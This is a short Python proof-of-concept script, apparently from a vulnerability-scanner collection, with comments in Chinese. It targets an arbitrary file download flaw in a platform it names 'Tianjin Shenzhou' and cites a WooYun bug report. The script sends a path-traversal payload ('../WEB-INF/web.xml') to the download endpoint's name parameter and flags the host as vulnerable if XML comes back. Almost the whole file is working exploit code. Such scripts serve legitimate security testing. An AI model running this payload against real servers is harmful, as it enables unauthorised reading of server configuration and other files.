#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天津神州助平台通用型任意下载
referer: http://www.wooyun.org/bugs/wooyun-2010-087767
author: Lucifer
description: 文件/gxwssb/fileDownloadmodel中,参数name存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result = ['天津神州助平台通用型任意下载','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/gxwssb/fileDownloadmodel?name=../WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
